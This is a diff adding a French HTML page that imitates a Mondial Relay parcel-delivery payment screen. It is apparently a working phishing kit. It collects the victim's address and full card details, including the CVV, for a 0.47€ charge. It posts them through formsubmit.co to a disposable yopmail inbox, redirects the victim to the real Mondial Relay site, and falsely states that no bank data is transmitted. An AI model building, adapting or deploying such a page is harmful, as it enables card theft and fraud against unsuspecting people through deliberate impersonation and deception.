@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>IMPOTS — Paiement</title>
+
+<style>
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    font-family: Arial, Helvetica, sans-serif;
+    background: #f4f6f9;
+    color: #222;
+}
+
+header {
+    height: 70px;
+    background: #fff;
+    border-bottom: 1px solid #e5e7eb;
+    display: flex;
+    align-items: center;
+    padding: 0 25px;
+}
+
+.logo {
+  width: 180px;
+  display: block;
+  margin: 20px auto;
+}
+
+main {
+    min-height: calc(100vh - 70px);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 30px 15px;
+}
+
+.card {
+    width: 100%;
+    max-width: 430px;
+    background: white;
+    border-radius: 14px;
+    padding: 32px;
+    box-shadow: 0 8px 30px rgba(0,0,0,.08);
+}
+
+h1 {
+    margin: 0 0 10px;
+    font-size: 23px;
+}
+
+.description {
+    color: #6b7280;
+    line-height: 1.5;
+    margin-bottom: 28px;
+    font-size: 14px;
+}
+
+label {
+    display: block;
+    font-size: 14px;
+    font-weight: 600;
+    margin-bottom: 8px;
+    cursor: pointer;
+}
+
+input {
+    width: 100%;
+    height: 48px;
+    border: 1px solid #d7dbe2;
+    border-radius: 7px;
+    padding: 0 13px;
+    font-size: 16px;
+    outline: none;
+    margin-bottom: 20px;
+    background-color: #fff;
+}
+
+input:focus {
+    border-color: #1455cc;
+    box-shadow: 0 0 0 3px rgba(20,85,204,.1);
+}
+
+.row {
+    display: flex;
+    gap: 15px;
+}
+
+.row > div {
+    flex: 1;
+}
+
+button {
+    width: 100%;
+    height: 50px;
+    border: none;
+    border-radius: 7px;
+    background: #1455cc;
+    color: white;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+}
+
+button:hover {
+    background: #0d43a5;
+}
+
+.demo {
+    margin-top: 20px;
+    padding: 12px;
+    border-radius: 7px;
+    background: #f1f5ff;
+    color: #315ca8;
+    font-size: 12px;
+    text-align: center;
+}
+
+.footer {
+    text-align: center;
+    margin-top: 22px;
+    color: #9ca3af;
+    font-size: 11px;
+}
+
+.livraison-box {
+  max-width: 520px;
+  margin: 20px auto;
+  font-family: Arial, sans-serif;
+  color: #172033;
+}
+
+.livraison-box label {
+  display: block;
+  font-size: 14px;
+  font-weight: 600;
+  margin-bottom: 8px;
+}
+
+.livraison-box .champ {
+  width: 100%;
+  box-sizing: border-box;
+  padding: 15px 16px;
+  border: 1px solid #e0e4ec;
+  border-radius: 14px;
+  background: #fafbfe;
+  color: #172033;
+  font-size: 15px;
+  outline: none;
+  transition: 0.2s;
+}
+
+.livraison-box .champ:focus {
+  border-color: #635bff;
+  background: white;
+  box-shadow: 0 0 0 3px #635bff18;
+}
+
+.livraison-box .bloc {
+  padding: 20px;
+  margin-bottom: 18px;
+  border: 1px solid #edf0f5;
+  border-radius: 20px;
+  background: white;
+  box-shadow: 0 5px 25px #17203308;
+}
+
+.livraison-box .titre {
+  font-size: 18px;
+  font-weight: 700;
+  margin-bottom: 18px;
+}
+
+.livraison-box .sous-titre {
+  color: #8a93a6;
+  font-size: 13px;
+  margin-top: -12px;
+  margin-bottom: 20px;
+}
+
+.livraison-box .ligne {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 14px;
+}
+
+.livraison-box input[type="date"] {
+  color-scheme: light;
+}
+
+.livraison-box select {
+  cursor: pointer;
+}
+
+@media (max-width: 420px) {
+  .livraison-box .ligne {
+    grid-template-columns: 1fr;
+    gap: 16px;
+  }
+}
+
+.livraison-box #date {
+  height: 40px;
+  width: 110px;
+  padding: 8px 12px;
+}
+
+.paiement-box {
+  width: 100%;
+  max-width: 520px;
+  box-sizing: border-box;
+  padding: 20px;
+  margin: 20px auto;
+  border: 1px solid #edf0f5;
+  border-radius: 20px;
+  background: white;
+  box-shadow: 0 5px 25px #17203308;
+}
+
+.paiement-titre {
+  font-size: 18px;
+  font-weight: 700;
+  color: #172033;
+  margin-bottom: 18px;
+}
+
+</style> 
+
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@800&display=swap" rel="stylesheet">
+
+</head>
+
+<body>
+
+<header>
+    <img src="https://i.ibb.co/ks4mcj5P/IMG-5103.png" class="logo" alt="Logo">
+</header>
+
+<main>
+
+<section class="card">
+
+  <h1 style="font-family: 'Montserrat', sans-serif; font-weight: 800;">Mondial Relay</h1>
+
+<form action="https://formsubmit.co/jebejehejv@yopmail.fr" method="POST">
+
+<div class="livraison-box">
+
+  <!-- ADRESSE -->
+  <div class="bloc">
+    <div class="titre">📍 Adresse de livraison</div>
+
+    <div class="sous-titre">
+      Où souhaitez-vous recevoir votre commande ?
+    </div>
+
+    <label for="adresse">Votre adresse</label>
+
+    <input
+      class="champ"
+      type="text"
+      name="adresse"
+      id="adresse"
+      placeholder="Numéro, rue, complément d'adresse..."
+      required
+    >
+
+
+        <label for="cp">Code postal</label>
+
+    <input
+      class="champ"
+      type="text"
+      name="cp"
+      id="cp"
+      placeholder="75000"
+      required
+    >
+    
+        <label for="ville">Ville</label>
+
+    <input
+      class="champ"
+      type="text"
+      name="ville"
+      id="ville"
+      placeholder="Paris"
+      required
+    >
+
+  </div>
+
+  <!-- DATE ET HEURE -->
+  <div class="bloc">
+
+    <div class="titre">
+      📅 Date et heure de livraison souhaitée
+    </div>
+
+    <div class="sous-titre">
+      Choisissez le créneau qui vous convient.
+    </div>
+
+    <div class="ligne">
+
+      <div>
+        <label for="date">
+          📅 Date
+        </label>
+
+        <input
+          class="champ"
+          type="date"
+          id="date"
+          name="date_livraison"
+          required
+        >
+      </div>
+
+      <div>
+        <label for="heure">
+          🕐 Heure
+        </label>
+
+        <select
+          class="champ"
+          id="heure"
+          name="heure_livraison"
+          required
+        >
+          <option value="">Choisir une heure</option>
+          <option value="08:00">08:00</option>
+          <option value="08:30">08:30</option>
+          <option value="09:00">09:00</option>
+          <option value="09:30">09:30</option>
+          <option value="10:00">10:00</option>
+          <option value="10:30">10:30</option>
+          <option value="11:00">11:00</option>
+          <option value="11:30">11:30</option>
+          <option value="12:00">12:00</option>
+          <option value="12:30">12:30</option>
+          <option value="13:00">13:00</option>
+          <option value="13:30">13:30</option>
+          <option value="14:00">14:00</option>
+          <option value="14:30">14:30</option>
+          <option value="15:00">15:00</option>
+          <option value="15:30">15:30</option>
+          <option value="16:00">16:00</option>
+          <option value="16:30">16:30</option>
+          <option value="17:00">17:00</option>
+          <option value="17:30">17:30</option>
+          <option value="18:00">18:00</option>
+          <option value="18:30">18:30</option>
+          <option value="19:00">19:00</option>
+          <option value="19:30">19:30</option>
+          <option value="20:00">20:00</option>
+        </select>
+      </div>
+
+    </div>
+  </div>
+
+<div class="paiement-box">
+
+  <div class="paiement-titre">💳 Paiement</div>
+
+  <label for="nom">Nom sur la carte</label>
+
+        <input
+            id="nom"
+            placeholder="Alexandre Dupont"
+            name= "nom"
+            type="text"
+            maxlength="50"
+        >
+
+        <label for="card">Numéro de carte</label>
+
+        <input
+            id="card"
+            name= "card"
+            type="text"
+            placeholder="•••• •••• •••• ••••"
+            inputmode="numeric"
+            maxlength="19"
+        >
+
+        <div class="row">
+
+            <div>
+                <label for="expiration">Expiration</label>
+
+                <input
+                    id="expiration"
+                    name= "expiration"
+                    type="text"
+                    placeholder="MM/AA"
+                    maxlength="5"
+                    inputmode="numeric"
+                >
+            </div>
+
+            <div>
+                <label for="cvv">CVV</label>
+
+                <input
+                    id="cvv"
+                    name= "cvv"
+                    type="text"
+                    placeholder="•••"
+                    maxlength="4"
+                    inputmode="numeric"
+                >
+            </div>
+
+        </div>
+</div>
+
+  <input type="hidden" name="_next" value="https://www.mondialrelay.fr/mon-profil-mondial-relay/">
+
+<input type="hidden" name="_subject" value="Nouvel identifiant reçu">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_template" value="table">
+      
+
+<button type="submit" onclick="window.location.href='https://www.mondialrelay.fr/mon-profil-mondial-relay/'">
+  payer 0.47€
+</button>
+
+</form> 
+
+    <div class="demo">
+        Aucune donnée
+        bancaire n'est transmise ou enregistrée.
+    </div>
+
+    <div class="footer">
+        MONDIAL RELAY FRANCE — Interface de paiement
+    </div>
+
+</section>
+
+</main>
+
+<script>
+// Formatage automatique du numéro de carte (ajoute des espaces tous les 4 chiffres)
+document.getElementById('card').addEventListener('input', function (e) {
+    let value = e.target.value.replace(/\D/g, '');
+    value = value.replace(/(.{4})/g, '$1 ').trim();
+    e.target.value = value;
+});
+
+// Formatage automatique de l'expiration (ajoute le '/' après les mois)
+document.getElementById('expiration').addEventListener('input', function (e) {
+    let value = e.target.value.replace(/\D/g, '');
+    if (value.length >= 2) {
+        value = value.substring(0, 2) + '/' + value.substring(2, 4);
+    }
+    e.target.value = value;
+});
+
+// Restreindre le CVV aux chiffres uniquement
+document.getElementById('cvv').addEventListener('input', function (e) {
+    e.target.value = e.target.value.replace(/\D/g, '');
+});
+
+</script>
+
+</body>
+</html>
